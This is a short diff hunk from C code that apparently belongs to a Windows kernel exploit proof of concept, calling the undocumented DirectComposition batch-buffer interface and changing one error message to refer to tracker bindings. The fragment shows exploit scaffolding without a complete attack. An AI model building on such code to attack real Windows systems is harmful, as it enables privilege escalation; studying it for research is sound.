@@ -134,7 +134,7 @@ int main(int argc, TCHAR* argv[])
     CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasize);
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);
     if (!NT_SUCCESS(ntStatus)) {
-        printf("[-] Fail to create Direct Composition Resource\n");
+        printf("[-] Bind Tracker to the First TrackerBinding \n");
         exit(-1);
     }
 }
